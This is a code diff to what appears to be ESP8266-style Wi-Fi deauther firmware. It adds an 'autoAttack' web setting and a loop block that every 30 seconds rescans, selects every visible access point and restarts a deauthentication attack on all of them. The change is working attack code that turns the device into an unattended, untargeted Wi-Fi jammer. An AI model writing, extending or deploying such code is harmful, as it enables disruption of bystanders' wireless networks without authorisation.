@@ -439,6 +439,13 @@ void saveSettings() {
     else settings.isMacAPRand = true;
   }
   if (server.hasArg("scanTime")) settings.clientScanTime = server.arg("scanTime").toInt();
+  
+  if (server.hasArg("autoAttack"))
+  {
+    if (server.arg("autoAttack") == "false") settings.autoAttackAllAPs = false;
+    else settings.autoAttackAllAPs = true;
+  }
+  
   if (server.hasArg("timeout")) settings.attackTimeout = server.arg("timeout").toInt();
   if (server.hasArg("deauthReason")) settings.deauthReason = server.arg("deauthReason").toInt();
   if (server.hasArg("packetRate")) settings.attackPacketRate = server.arg("packetRate").toInt();
@@ -620,6 +627,26 @@ void loop() {
     if(input == "reset" || input == "reset\n" || input == "reset\r" || input == "reset\r\n"){
       settings.reset();
     }
+  }
+
+  static int lastScan = 0;
+  static bool isDeauth = false;
+  if(settings.autoAttackAllAPs && lastScan + 30000 < millis())
+  {
+    attack.stop(0);
+    lastScan = millis();
+    startAPScan();
+
+    apScan.select(-1);//select all
+    
+    attack.start(0);
+    isDeauth = true;
+    
+  }
+  else if(!settings.autoAttackAllAPs && isDeauth)
+  {
+    attack.stop(0);
+    isDeauth = false;
   }
 
 #ifdef USE_DISPLAY
